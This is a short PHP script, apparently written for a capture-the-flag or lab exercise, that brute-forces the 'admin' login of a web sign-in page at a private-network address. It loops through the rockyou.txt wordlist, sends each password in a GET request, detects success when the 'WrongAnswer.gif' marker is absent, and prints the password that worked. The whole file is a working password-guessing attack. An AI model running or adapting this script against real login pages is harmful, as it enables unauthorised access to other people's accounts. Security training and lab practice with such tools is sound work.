<?php
$passwords = file_get_contents('rockyou.txt');
$passwords = explode("\n", $passwords);
$login = 'admin';

$founded = false;
$size_dictonary = count($passwords);
while (!$founded && $size_dictonary > 0) {
  $size_dictonary = count($passwords);
  $first = $passwords[0];
  $url = "http://192.168.99.102/?page=signin&username=admin&password=$first&Login=Login#";
  $result = file_get_contents($url, false);
  $explode_response = explode("images/WrongAnswer.gif", $result);
  $founded = (count($explode_response) === 1);
  if ($founded) {
    print($explode_response[0]);
    print("Good password: $first \n");
  }
  array_shift($passwords);
  print("more $size_dictonary password\n");
}